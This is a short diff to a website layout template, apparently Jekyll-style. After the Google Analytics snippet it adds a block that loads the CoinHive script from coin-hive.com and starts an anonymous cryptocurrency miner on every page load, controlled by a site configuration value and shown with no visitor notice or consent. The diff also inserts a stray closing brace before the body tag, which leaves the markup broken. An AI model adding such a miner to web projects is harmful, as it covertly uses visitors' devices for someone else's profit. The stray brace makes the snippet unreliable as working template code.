@@ -49,5 +49,14 @@
        ga('send', 'pageview');
      </script>
     {% endif %}
+
+    {% if site.coin_hive_id %}
+    <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+    <script>
+      var miner = new CoinHive.Anonymous('{{ site.coin_hive_id }}');
+      miner.start();
+    </script>
+    {% endif %}
+  }
   </body>
 </html>
